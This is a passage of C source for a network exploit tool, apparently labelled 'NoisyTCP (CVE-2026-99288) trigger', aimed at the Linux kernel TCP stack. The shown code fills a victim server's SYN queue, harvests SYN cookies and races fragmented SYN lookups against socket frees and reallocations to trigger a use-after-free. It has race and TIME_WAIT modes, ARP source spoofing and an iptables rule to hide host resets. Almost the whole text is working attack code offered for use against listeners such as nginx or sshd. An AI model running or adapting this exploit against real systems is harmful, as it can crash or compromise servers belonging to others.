		tcp_send(sport, seq, 0, F_SYN, NULL, 0);
		g_junk[g_junk_tail % JUNK_MAX].sport = sport;
		g_junk[g_junk_tail % JUNK_MAX].seq = seq;
		g_junk_tail++;
	}
}

static void junk_drain(int n)
{
	if ((unsigned int)n > junk_count())
		n = (int)junk_count();
	while (n-- > 0) {
		struct junk_req *j = &g_junk[g_junk_head % JUNK_MAX];

		tcp_send(j->sport, j->seq + 1, 0, F_RST, NULL, 0);
		g_junk_head++;
	}
}

static void junk_drain_all(void)
{
	junk_drain((int)junk_count());
}

/*
 * Is there a request socket for tuple @sport whose SYN sequence number was
 * @rcv_isn?
 *
 * tcp_check_req() answers an out-of-window SYN with a challenge ACK when a
 * request socket matches the tuple, while the listener's tcp_conn_request()
 * answers with a SYN-ACK when the tuple is unknown.  @rcv_isn + 2^31 is
 * guaranteed to be outside the 64 KiB SYN-ACK window, so the ambiguity of a
 * random sequence number does not arise (a SYN that lands inside the window
 * without matching rcv_isn takes the embryonic-reset path and would drop the
 * request socket instead).
 *
 * Returns 1 = request socket present, 0 = absent (cookie path), -1 = no answer.
 */
static int probe_tuple_ex(uint16_t sport, uint32_t rcv_isn, int timeout_ms,
			  bool cleanup)
{
	uint32_t seq = rcv_isn + 0x80000000u;
	struct synwatch w = syn_watch(sport);
	uint32_t flags;

	tcp_send(sport, seq, 0, F_SYN, NULL, 0);
	flags = syn_wait(&w, timeout_ms, NULL, NULL);
	if (g.debug)
		info("[dbg] probe_tuple sport=%u seq=0x%08x flags=0x%02x\n",
		     (unsigned)sport, seq, flags);
	if (cleanup) {
		/* Drop the request socket the probe may have created ... */
		tcp_send(sport, seq + 1, 0, F_RST, NULL, 0);
		/* ... and the one the preceding SYN may have created. */
		tcp_send(sport, rcv_isn + 1, 0, F_RST, NULL, 0);
	}

	if (flags & F_SYN)
		return 0;
	if (flags & F_ACK)
		return 1;
	return -1;
}

static int probe_tuple(uint16_t sport, uint32_t rcv_isn)
{
	return probe_tuple_ex(sport, rcv_isn, g.synack_ms, false);
}

/*
 * Find the target's effective listen(2) backlog without knowing it.
 *
 * With `fill` pending requests in the queue, a further SYN creates a request
 * socket while fill < backlog and is answered statelessly once fill >= backlog.
 * That predicate is monotonic, so a binary search over [1, 4096] finds the
 * smallest saturating fill, which is exactly sk_max_ack_backlog.
 */
static int calibrate_fill(void)
{
	int lo = 1;
	int hi = 4096;
	int iter;

	if (g.no_calibrate) {
		if (g.backlog > 0)
			g.fill = g.backlog;
		return g.fill;
	}

	for (iter = 0; iter < 16 && lo < hi; iter++) {
		int mid = lo + (hi - lo) / 2;
		int r = -1;
		int tries;

		for (tries = 0; tries < 4 && r < 0; tries++) {
			uint16_t sport = take_sport();
			uint32_t s = rnd32();
			int tmo = g.synack_ms << tries;

			junk_drain_all();
			sleep_us(g.settle_us);
			junk_fill(mid);
			sleep_us(g.settle_us + (g.settle_us * (mid / 256)));

			struct synwatch w = syn_watch(sport);

			/* With room in the queue this creates a request socket
			 * with rcv_isn == s; with the queue full the SYN is
			 * answered statelessly and no request socket appears.
			 * Always consume the answer to this SYN, otherwise it
			 * can be mistaken for the reply to the probe below. */
			tcp_send(sport, s, 0, F_SYN, NULL, 0);
			if (!syn_wait_ack(&w, s, NULL, tmo))
				continue; /* the target is still busy; retry */
			sleep_us(g.settle_us);
			r = probe_tuple_ex(sport, s, tmo, true);
		}
		if (r < 0)
			die("target does not answer SYN packets on port %u",
			    (unsigned)g.dport);
		if (g.debug)
			info("[dbg] calib mid=%d r=%d\n", mid, r);
		if (r == 1)
			lo = mid + 1;
		else
			hi = mid;
	}

	g.fill = lo;
	info("[*] SYN queue saturates at %d pending requests\n", g.fill);
	if (g.fill <= 4)
		info("[!] the listener accepts almost no pending request: it may "
		     "run net.ipv4.tcp_syncookies=2, in which case use --mode tw\n");
	return g.fill;
}

/* ------------------------------------------------------------------------- */
/* one race round                                                            */
/* ------------------------------------------------------------------------- */

struct target {
	uint16_t sport;
	uint32_t hseq;   /* sequence number of the cookie SYN */
	uint32_t rseq;   /* sequence number of the SYN that created R */
	uint32_t cookie; /* server ISN of the SYN-ACK, 0 if not received */
	uint32_t mark;   /* segment counter snapshot */
	uint16_t ipid;
};

static uint8_t g_payload[64];

static void seed_reader(const struct target *t)
{
	tcp_send_frag(t->sport, t->rseq, 0, F_SYN, g_payload, g.payload, t->ipid,
		      FRAG_FIRST);
}

static void fire_reader(const struct target *t)
{
	/* completing the reassembly runs tcp_v4_rcv() -> __inet_lookup_established()
	 * in the RX context that owns the fragment hash */
	tcp_send_frag(t->sport, t->rseq, 0, F_SYN, g_payload, g.payload, t->ipid,
		      FRAG_LAST);
}

/*
 * Additional lookups in flight while the free + reallocation happen.  Each one
 * is a fresh fragmented SYN retransmission for the same request socket, so it
 * goes through the same lockless lookup without changing any state.
 */
static void extra_readers(const struct target *t)
{
	int i;

	for (i = 1; i < g.readers; i++) {
		uint16_t id = g_ipid++;

		tcp_send_frag(t->sport, t->rseq, 0, F_SYN, g_payload, g.payload, id,
			      FRAG_FIRST);
		tcp_send_frag(t->sport, t->rseq, 0, F_SYN, g_payload, g.payload, id,
			      FRAG_LAST);
	}
}

static void shoot(struct target *t, int n)
{
	int i;
	int live = 0;

	for (i = 0; i < n; i++) {
		if (!t[i].cookie)
			continue;
		t[i].ipid = g_ipid++;
		seed_reader(&t[i]);
		live++;
	}
	if (!live)
		return;

	spin_us(g.frag_gap_us + rnd_range(g.jitter_us + 1));

	for (i = 0; i < n; i++) {
		if (!t[i].cookie)
			continue;

		/* 1. the lookup packet is completed here */
		fire_reader(&t[i]);
		extra_readers(&t[i]);

		/* 2. free R: seq == rcv_nxt, so tcp_check_req() takes the
		 *    embryonic-reset path and drops the request socket */
		spin_us(g.free_gap_us + rnd_range(g.jitter_us + 1));
		tcp_send(t[i].sport, t[i].rseq + 1, 0, F_RST, NULL, 0);

		/* 3. reallocate the slab slot: the ACK carries the cookie, so
		 *    cookie_v4_check() -> tcp_get_cookie_sock() publishes a new,
		 *    unhashed request socket with refcount 1 and a NULL
		 *    rsk_listener at the address the reader may still hold */
		spin_us(g.alloc_gap_us + rnd_range(g.jitter_us + 1));
		tcp_send(t[i].sport, t[i].hseq + 1, t[i].cookie + 1, F_ACK, NULL,
			 0);

		/* 4. close the child the cookie created, keeping the accept
		 *    queue empty for the next round */
		if (!g.keep_children)
			tcp_send(t[i].sport, t[i].hseq + 1, 0, F_RST, NULL, 0);
	}
	g_attempts += (unsigned long)live;
}

static struct target g_prev[MAX_BATCH];
static int g_prev_n;

/* Drop request sockets left behind by the previous batch (failed rounds). */
static void cleanup_previous(void)
{
	int i;

	for (i = 0; i < g_prev_n; i++) {
		if (!g_prev[i].hseq && !g_prev[i].rseq)
			continue;
		if (g_prev[i].hseq)
			tcp_send(g_prev[i].sport, g_prev[i].hseq + 1, 0, F_RST,
				 NULL, 0);
		if (g_prev[i].rseq)
			tcp_send(g_prev[i].sport, g_prev[i].rseq + 1, 0, F_RST,
				 NULL, 0);
	}
	g_prev_n = 0;
}

static void run_round(void)
{
	struct target t[MAX_BATCH];
	uint64_t deadline;
	int n = g.batch;
	int got = 0;
	int i;

	if (n > MAX_BATCH)
		n = MAX_BATCH;

	cleanup_previous();

	/*
	 * Refill the SYN queue deterministically: drop every tracked request
	 * socket, then create exactly g.fill new ones.  g.fill was measured to
	 * be the smallest number of pending requests that saturates
	 * inet_csk_reqsk_queue_is_full(), so the cookie SYNs below really do
	 * take the syncookie path.
	 */
	junk_drain_all();
	sleep_us(g.settle_us);
	junk_fill(g.fill);
	sleep_us(g.settle_us);

	/* cookie harvest: the queue is full, so these SYNs take the
	 * syncookie path and the reply's sequence number is the cookie */
	memset(t, 0, sizeof(t));
	for (i = 0; i < n; i++) {
		t[i].sport = take_sport();
		t[i].hseq = rnd32();
		t[i].mark = seg_count(t[i].sport);
		tcp_send(t[i].sport, t[i].hseq, 0, F_SYN, NULL, 0);
	}
	deadline = now_ns() + (uint64_t)g.synack_ms * 1000000ull;
	for (;;) {
		got = 0;
		for (i = 0; i < n; i++) {
			uint32_t flags = 0, isn = 0, ack = 0;

			if (t[i].cookie) {
				got++;
				continue;
			}
			if (seg_count(t[i].sport) == t[i].mark)
				continue;
			t[i].mark = seg_count(t[i].sport);
			seg_read(t[i].sport, &flags, &isn, &ack);
			if ((flags & (F_SYN | F_ACK)) == (F_SYN | F_ACK) &&
			    ack == t[i].hseq + 1)
				t[i].cookie = isn;
		}
		if (got == n || now_ns() >= deadline)
			break;
		sleep_us(50);
	}
	g_cookies += (unsigned long)got;

	/* empty the queue, then create one hashed request socket per tuple;
	 * an empty queue guarantees inet_csk_reqsk_queue_hash_add() succeeds */
	junk_drain_all();
	sleep_us(g.settle_us);
	for (i = 0; i < n; i++) {
		if (!t[i].cookie)
			continue;
		t[i].rseq = rnd32();
		tcp_send(t[i].sport, t[i].rseq, 0, F_SYN, NULL, 0);
	}
	sleep_us(g.settle_us);

	shoot(t, n);

	memcpy(g_prev, t, sizeof(t));
	g_prev_n = n;
	g_rounds++;
}

static int mode_race(void)
{
	uint64_t t0 = now_ns();
	uint64_t deadline;
	uint64_t next_report = t0 + 1000000000ull;

	info("[*] target %s:%u  src %s  dev %s\n",
	     ipstr(g.dst), (unsigned)g.dport, ipstr(g.src), g.ifname);
	calibrate_fill();
	info("[*] race: batch=%d readers=%d fill=%d gaps=%d/%d/%d us jitter=%d us\n",
	     g.batch, g.readers, g.fill, g.frag_gap_us, g.free_gap_us,
	     g.alloc_gap_us, g.jitter_us);

	deadline = now_ns() + (uint64_t)g.duration * 1000000000ull;
	while (!g_stop && now_ns() < deadline) {
		run_round();
		if (now_ns() >= next_report) {
			double el = (double)(now_ns() - t0) / 1e9;

			info("[*] %6.1fs rounds=%lu attempts=%lu (%.0f/s) cookies=%lu synacks=%lu\n",
			     el, g_rounds, g_attempts, (double)g_attempts / el,
			     g_cookies, g_synacks);
			next_report = now_ns() + 1000000000ull;
		}
	}

	if (g_rst_leaks)
		info("[!] the local kernel leaked RSTs during the probe; the "
		     "target's request sockets will not survive\n");
	/* leave the target's SYN queue as we found it */
	junk_drain_all();
	cleanup_previous();
	info("[+] done: rounds=%lu attempts=%lu cookies=%lu synacks=%lu "
	     "send=%lu errors=%lu\n",
	     g_rounds, g_attempts, g_cookies, g_synacks, g_send_calls,
	     g_send_errs);
	return 0;
}

/* ------------------------------------------------------------------------- */
/* verify / probe                                                            */
/* ------------------------------------------------------------------------- */

static int mode_probe(void)
{
	uint16_t sport = take_sport();
	uint32_t seq = rnd32();
	uint32_t isn = 0;

	info("[*] probe %s:%u from %s:%u\n", ipstr(g.dst),
	     (unsigned)g.dport, ipstr(g.src), (unsigned)sport);
	{
		struct synwatch w = syn_watch(sport);

		tcp_send(sport, seq, 0, F_SYN, NULL, 0);
		if (!syn_wait_ack(&w, seq, &isn, 1000)) {
			info("[-] no SYN-ACK (filtered port, wrong interface or "
			     "ARP problem)\n");
			if (g.debug)
				info("[dbg] send=%lu errs=%lu frames=%lu ip=%lu "
				     "tcp=%lu\n",
				     g_send_calls, g_send_errs, g_rx_frames,
				     g_rx_ip, g_rx_tcp);
			return 1;
		}
	}
	info("[+] SYN-ACK received, server ISN 0x%08x\n", isn);
	sleep_us(100000);
	if (g_rst_leaks)
		info("[!] the local kernel answered the SYN-ACK with a RST; the "
		     "target's request socket is destroyed immediately\n");
	else
		info("[+] no host-generated RST seen\n");
	tcp_send(sport, seq + 1, 0, F_RST, NULL, 0);
	return 0;
}

static int mode_verify(void)
{
	uint16_t sport = take_sport();
	uint32_t hseq = rnd32();
	uint32_t rseq;
	uint32_t cookie = 0;
	uint32_t risn = 0;
	int has_r;

	info("[*] target %s:%u  src %s  dev %s\n",
	     ipstr(g.dst), (unsigned)g.dport, ipstr(g.src), g.ifname);

	info("[1/5] calibrating the SYN queue\n");
	calibrate_fill();
	sleep_us(g.settle_us);

	info("[2/5] harvesting a SYN cookie for one tuple\n");
	{
		struct synwatch w = syn_watch(sport);

		tcp_send(sport, hseq, 0, F_SYN, NULL, 0);
		if (!syn_wait_ack(&w, hseq, &cookie, 1000)) {
			info("[-] no SYN-ACK for the cookie probe\n");
			return 1;
		}
	}
	info("      cookie = 0x%08x (server ISN)\n", cookie);

	info("[3/5] freeing a queue slot and creating a hashed request socket\n");
	junk_drain(1);
	sleep_us(g.settle_us);
	rseq = rnd32();
	{
		struct synwatch w = syn_watch(sport);

		tcp_send(sport, rseq, 0, F_SYN, NULL, 0);
		if (!syn_wait_ack(&w, rseq, &risn, 1000)) {
			info("[-] no SYN-ACK for the request-socket SYN\n");
			return 1;
		}
	}
	info("      request socket created, server ISN 0x%08x\n", risn);

	info("[4/5] checking that the request socket is really in ehash\n");
	has_r = probe_tuple(sport, rseq);
	if (has_r == 1)
		info("      yes: an out-of-window SYN got a challenge ACK\n");
	else if (has_r == 0)
		info("      no: the tuple took the syncookie path (queue not "
		     "full; raise --backlog/--fill)\n");
	else
		info("      inconclusive: no answer to the probe SYN\n");

	info("[5/5] freeing R and reallocating its slot with the cookie\n");
	tcp_send(sport, rseq + 1, 0, F_RST, NULL, 0);
	sleep_us(g.settle_us);
	tcp_send(sport, hseq + 1, cookie + 1, F_ACK, NULL, 0);
	info("      shot sent (the target's counters should now show "
	     "SyncookiesRecv/EmbryonicRsts)\n");
	sleep_us(100000);
	/* leave the target's SYN queue as we found it */
	junk_drain_all();
	return 0;
}

/* ------------------------------------------------------------------------- */
/* TIME_WAIT mode (targets with net.ipv4.tcp_syncookies=2)                   */
/* ------------------------------------------------------------------------- */

/*
 * With tcp_syncookies=2 every SYN gets a cookie and no request socket is
 * ever created by the normal path, so race mode has nothing to free.  A
 * request socket can still be created from a TIME_WAIT socket:
 *
 *   SYN -> SYN-ACK(cookie) -> ACK -> child -> (app closes) -> FIN
 *   -> ACK -> FIN|ACK -> TIME_WAIT -> SYN(seq > tw_rcv_nxt)
 *
 * tcp_timewait_state_process() then returns TCP_TW_SYN, tcp_v4_rcv() calls
 * tcp_conn_request() with TCP_SKB_CB(skb)->tcp_tw_isn set, and the
 * `if (!isn)` guard skips the syncookie block, so a hashed request socket is
 * created.  The listener must accept and close the connection immediately for
 * this to work (a service that keeps the connection open does not).
 */
static int tw_attempt(void)
{
	uint16_t sport = take_sport();
	uint32_t s1 = rnd32();
	uint32_t cookie = 0, fseq = 0, fack = 0, aseq = 0, aack = 0;
	uint32_t flags;
	uint32_t s2;
	struct target t;

	{
		struct synwatch w = syn_watch(sport);

		tcp_send(sport, s1, 0, F_SYN, NULL, 0);
		if (!syn_wait_ack(&w, s1, &cookie, g.synack_ms))
			return 0;
	}
	g_cookies++;

	/* complete the handshake */
	tcp_send(sport, s1 + 1, cookie + 1, F_ACK, NULL, 0);

	/* the listener accepts and closes: wait for its FIN */
	{
		struct synwatch w = syn_watch(sport);

		flags = syn_wait(&w, 300, &fseq, &fack);
	}
	if (!(flags & F_FIN))
		return 0;

	/* ACK and FIN must be separate segments; a combined one takes the
	 * "bad case" branch in tcp_fin() and defers TIME_WAIT */
	tcp_send(sport, fack, fseq + 1, F_ACK, NULL, 0);
	sleep_us(200);
	tcp_send(sport, fack, fseq + 1, F_FIN | F_ACK, NULL, 0);

	{
		struct synwatch w = syn_watch(sport);

		flags = syn_wait(&w, 300, &aseq, &aack);
	}
	if (!(flags & F_ACK) || aack != fack + 1 || aseq != fseq + 1)
		return 0;

	/* absorb the TIME_WAIT socket and create a hashed request socket.
	 * The ISN must be strictly after tw_rcv_nxt (s1 + 2). */
	s2 = s1 + 3;
	{
		struct synwatch w = syn_watch(sport);

		tcp_send(sport, s2, 0, F_SYN, NULL, 0);
		if (!syn_wait_ack(&w, s2, NULL, g.synack_ms))
			return 0;
	}
	sleep_us(50);

	memset(&t, 0, sizeof(t));
	t.sport = sport;
	t.hseq = s1;
	t.rseq = s2;
	t.cookie = cookie;
	t.ipid = g_ipid++;
	shoot(&t, 1);
	return 1;
}

static int mode_tw(void)
{
	uint64_t t0 = now_ns();
	uint64_t deadline = t0 + (uint64_t)g.duration * 1000000000ull;
	uint64_t next_report = t0 + 1000000000ull;

	if (!g.quiet) {
		info("[*] TIME_WAIT mode: target %s:%u (needs "
		     "net.ipv4.tcp_syncookies=2 and a listener that accepts and "
		     "closes immediately)\n",
		     ipstr(g.dst), (unsigned)g.dport);
	}
	while (!g_stop && now_ns() < deadline) {
		tw_attempt();
		if (now_ns() >= next_report) {
			double el = (double)(now_ns() - t0) / 1e9;

			info("[*] %6.1fs attempts=%lu (%.0f/s) cookies=%lu\n",
			     el, g_attempts, (double)g_attempts / el, g_cookies);
			next_report = now_ns() + 1000000000ull;
		}
	}
	info("[+] done: attempts=%lu cookies=%lu\n", g_attempts, g_cookies);
	return 0;
}

/* ------------------------------------------------------------------------- */
/* startup: options, routes, sockets                                         */
/* ------------------------------------------------------------------------- */

static void usage(FILE *out, const char *a0)
{
	fprintf(out,
		"usage: %s --victim IP --port PORT [options]\n"
		"\n"
		"  --victim IP            target IPv4 address (required)\n"
		"  --port PORT            target TCP port (required)\n"
		"  --mode M               probe | verify | race | tw   (default race)\n"
		"  --src IP               source address to spoof/use (default: route)\n"
		"  --spoof                claim --src with ARP; the local kernel then\n"
		"                         never sees the SYN-ACKs and never RSTs them\n"
		"  --dev NAME             interface (default: from the route)\n"
		"  --backlog N            target listen backlog (default: calibrate)\n"
		"  --fill N               SYNs used to fill the SYN queue\n"
		"  --batch N              tuples raced per round (default 8, max 64)\n"
		"  --readers N            fragmented lookups per shot (default 1)\n"
		"  --duration SEC         race duration (default 60)\n"
		"  --payload N            reader TCP payload bytes (default 16)\n"
		"  --frag-split N         bytes in the first fragment (default 24)\n"
		"  --frag-gap-us N        seed -> lookup gap (default 20)\n"
		"  --free-gap-us N        lookup -> RST gap (default 0)\n"
		"  --alloc-gap-us N       RST -> cookie ACK gap (default 4)\n"
		"  --jitter-us N          random jitter added to each gap (default 4)\n"
		"  --settle-us N          delay between packet groups (default 300)\n"
		"  --synack-ms N          SYN-ACK wait (default 10)\n"
		"  --sport-range A-B      source port range (default 32768-60999)\n"
		"  --mark N               SO_MARK for the raw socket (default 1)\n"
		"  --no-calibrate         trust --backlog instead of probing\n"
		"  --assume-ok            do not abort when the host RSTs SYN-ACKs\n"
		"  --keep-children        do not close the children the shot creates\n"
		"  --debug                packet-level diagnostics\n"
		"  --quiet                only errors\n"
		"\n"
		"The target must be a plain TCP listener (nginx, apache, sshd...).\n"
		"Requires root (raw sockets + AF_PACKET).\n",
		a0);
}

static void parse_range(const char *s, int *lo, int *hi)
{
	int a = 0, b = 0;

	if (sscanf(s, "%d-%d", &a, &b) != 2 || a < 1 || b > 65535 || a >= b)
		die("bad --sport-range '%s'", s);
	*lo = a;
	*hi = b;
}

static void parse_args(int argc, char **argv)
{
	int i;
	bool have_victim = false;
	bool have_port = false;
	const char *src = NULL;
	const char *dev = NULL;

	for (i = 1; i < argc; i++) {
		const char *a = argv[i];
		const char *v = (i + 1 < argc) ? argv[i + 1] : NULL;

		if (!strcmp(a, "-h") || !strcmp(a, "--help")) {
			usage(stdout, argv[0]);
			exit(0);
		} else if (!strcmp(a, "--victim") && v) {
			if (inet_pton(AF_INET, v, &g.dst) != 1)
				die("bad --victim address '%s'", v);
			have_victim = true;
			i++;
		} else if (!strcmp(a, "--port") && v) {
			g.dport = (uint16_t)atoi(v);
			have_port = true;
			i++;
		} else if (!strcmp(a, "--src") && v) {
			src = v;
			i++;
		} else if (!strcmp(a, "--dev") && v) {
			dev = v;
			i++;
		} else if (!strcmp(a, "--spoof")) {
			g.spoof = true;
		} else if (!strcmp(a, "--mode") && v) {
			if (!strcmp(v, "probe"))
				g.mode = MODE_PROBE;
			else if (!strcmp(v, "verify"))
				g.mode = MODE_VERIFY;
			else if (!strcmp(v, "race"))
				g.mode = MODE_RACE;
			else if (!strcmp(v, "tw"))
				g.mode = MODE_TW;
			else
				die("unknown mode '%s'", v);
			i++;
		} else if (!strcmp(a, "--backlog") && v) {
			g.backlog = atoi(v);
			g.no_calibrate = true;
			i++;
		} else if (!strcmp(a, "--fill") && v) {
			g.fill = atoi(v);
			g.no_calibrate = true;
			i++;
		} else if (!strcmp(a, "--batch") && v) {
			g.batch = atoi(v);
			i++;
		} else if (!strcmp(a, "--readers") && v) {
			g.readers = atoi(v);
			i++;
		} else if (!strcmp(a, "--duration") && v) {
			g.duration = atoi(v);
			i++;
		} else if (!strcmp(a, "--payload") && v) {
			g.payload = atoi(v);
			i++;
		} else if (!strcmp(a, "--frag-split") && v) {
			g.frag_split = atoi(v);
			i++;
		} else if (!strcmp(a, "--frag-gap-us") && v) {
			g.frag_gap_us = atoi(v);
			i++;
		} else if (!strcmp(a, "--free-gap-us") && v) {
			g.free_gap_us = atoi(v);
			i++;
		} else if (!strcmp(a, "--alloc-gap-us") && v) {
			g.alloc_gap_us = atoi(v);
			i++;
		} else if (!strcmp(a, "--jitter-us") && v) {
			g.jitter_us = atoi(v);
			i++;
		} else if (!strcmp(a, "--settle-us") && v) {
			g.settle_us = atoi(v);
			i++;
		} else if (!strcmp(a, "--synack-ms") && v) {
			g.synack_ms = atoi(v);
			i++;
		} else if (!strcmp(a, "--sport-range") && v) {
			parse_range(v, &g.sport_low, &g.sport_high);
			i++;
		} else if (!strcmp(a, "--mark") && v) {
			g.mark = (uint32_t)strtoul(v, NULL, 0);
			i++;
		} else if (!strcmp(a, "--no-calibrate")) {
			g.no_calibrate = true;
		} else if (!strcmp(a, "--assume-ok")) {
			g.assume_ok = true;
		} else if (!strcmp(a, "--keep-children")) {
			g.keep_children = true;
		} else if (!strcmp(a, "--quiet")) {
			g.quiet = true;
		} else if (!strcmp(a, "--debug")) {
			g.debug = true;
		} else {
			usage(stderr, argv[0]);
			die("unknown or incomplete option '%s'", a);
		}
	}

	if (!have_victim || !have_port || g.dport == 0) {
		usage(stderr, argv[0]);
		die("--victim and --port are required");
	}
	if (g.batch < 1 || g.batch > MAX_BATCH)
		die("--batch must be 1..%d", MAX_BATCH);
	if (g.readers < 1)
		die("--readers must be >= 1");
	if (g.payload < 1 || g.payload > (int)sizeof(g_payload))
		die("--payload must be 1..%d", (int)sizeof(g_payload));
	if (g.frag_split < 8 || g.frag_split % 8 != 0)
		die("--frag-split must be a multiple of 8");
	if (g.frag_split >= TCP_HDR_LEN + g.payload)
		die("--frag-split must be smaller than the segment (%d)",
		    TCP_HDR_LEN + g.payload);
	if (g.sport_high - g.sport_low < 4 * g.batch)
		die("--sport-range is too small for --batch");
	if (g.settle_us < 0 || g.jitter_us < 0 || g.duration < 1)
		die("bad timing values");

	memset(g_payload, 'A', sizeof(g_payload));

	if (src) {
		if (inet_pton(AF_INET, src, &g.src) != 1)
			die("bad --src address '%s'", src);
	}
	if (dev)
		snprintf(g.ifname, sizeof(g.ifname), "%s", dev);
}

static void setup(void)
{
	struct in_addr gw;
	struct in_addr droute;
	char ifname[IF_NAMESIZE] = "";
	bool src_local;

	if (!g.src.s_addr) {
		g.src.s_addr = src_for_dst(g.dst);
		if (!g.src.s_addr)
			die("cannot determine the source address for %s",
			    ipstr(g.dst));
	}

	src_local = is_local_addr(g.src);

	if (g.spoof) {
		if (!g.have_ifmac && !g.ifname[0]) {
			/* resolved below */
		}
		if (src_local)
			die("--spoof requires a source address that is not "
			    "assigned to this host (%s is local)",
			    ipstr(g.src));
	} else if (!src_local) {
		die("source %s is not a local address; add --spoof to claim it "
		    "with ARP", ipstr(g.src));
	}

	if (!g.ifname[0]) {
		memset(&gw, 0, sizeof(gw));
		droute = g.dst;
		if (route_lookup(droute, &gw, ifname, sizeof(ifname)) < 0) {
			if ((ntohl(g.dst.s_addr) >> 24) == 127)
				snprintf(ifname, sizeof(ifname), "lo");
			else
				die("no route to %s; use --dev",
				    ipstr(g.dst));
		}
		snprintf(g.ifname, sizeof(g.ifname), "%s", ifname);
	}
	if (iface_info(g.ifname) < 0)
		die("cannot use interface %s", g.ifname);

	if (g.spoof && !g.have_ifmac)
		die("interface %s has no MAC address; --spoof needs Ethernet",
		    g.ifname);

	if (tx_open() < 0)
		die("cannot open a raw IPv4 socket (%s) - run as root",
		    strerror(errno));
	if (rx_open() < 0)
		die("cannot open an AF_PACKET socket (%s) - run as root",
		    strerror(errno));

	if (!g.quiet) {
		printf("NoisyTCP (CVE-2026-99288) trigger\n");
		printf("[*] victim %s:%u from %s dev %s%s\n", ipstr(g.dst),
		       (unsigned)g.dport, ipstr(g.src), g.ifname,
		       g.spoof ? " (ARP-claimed)" : "");
	}
}

static void on_signal(int sig)
{
	(void)sig;
	g_stop = 1;
}

/*
 * The local kernel sees the target's SYN-ACK for a tuple it has no socket
 * for and answers it with a RST (tcp_v4_send_reset() from no_tcp_socket).
 * That RST carries seq = our ISN + 1 and is therefore exactly the in-window
 * reset that drops the request socket we are about to race against.  Detect
 * it before doing any real work.
 */
static void leak_check(void)
{
	uint16_t sport = take_sport();
	uint32_t seq = rnd32();
	uint32_t isn = 0;
	struct synwatch w;

	atomic_store_explicit(&g_rst_seen, 0, memory_order_relaxed);
	atomic_store_explicit(&g_rst_watch, sport, memory_order_relaxed);
	w = syn_watch(sport);
	tcp_send(sport, seq, 0, F_SYN, NULL, 0);
	if (syn_wait_ack(&w, seq, &isn, 1000))
		sleep_us(100000);
	atomic_store_explicit(&g_rst_watch, 0, memory_order_relaxed);
	if (atomic_load_explicit(&g_rst_seen, memory_order_relaxed))
		g_rst_leaks++;

	tcp_send(sport, seq + 1, 0, F_RST, NULL, 0);

	if (g_rst_leaks && !g.assume_ok) {
		die("the local kernel answered the SYN-ACK with a RST.\n"
		    "      That RST has seq = ISN+1, i.e. it is exactly the "
		    "in-window reset that drops the request socket.\n"
		    "      Suppress host RSTs for the source port range, e.g.:\n"
		    "\n"
		    "        iptables -I OUTPUT -p tcp --sport %d:%d "
		    "--tcp-flags RST RST \\\n"
		    "                 -m mark ! --mark 0x%x -j DROP\n"
		    "\n"
		    "      (this tool marks its own raw packets with SO_MARK), or "
		    "use --spoof\n"
		    "      with a --src that is not assigned to this host.  "
		    "--assume-ok skips this check.",
		    g.sport_low, g.sport_high, g.mark);
	}
	if (g_rst_leaks)
		info("[!] host RST leak detected and ignored (--assume-ok)\n");
	else if (!g.quiet)
		info("[*] no host RST leak\n");
}

int main(int argc, char **argv)
{
	pthread_t sniffer;

	parse_args(argc, argv);
	setup();

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);
	signal(SIGPIPE, SIG_IGN);

	if (pthread_create(&sniffer, NULL, sniffer_main, NULL) != 0)
		die("cannot start the packet sniffer thread");

	leak_check();

	switch (g.mode) {
	case MODE_PROBE:
		return mode_probe();
	case MODE_VERIFY:
		return mode_verify();
	case MODE_TW:
		return mode_tw();
	case MODE_RACE:
	default:
		return mode_race();
	}
}
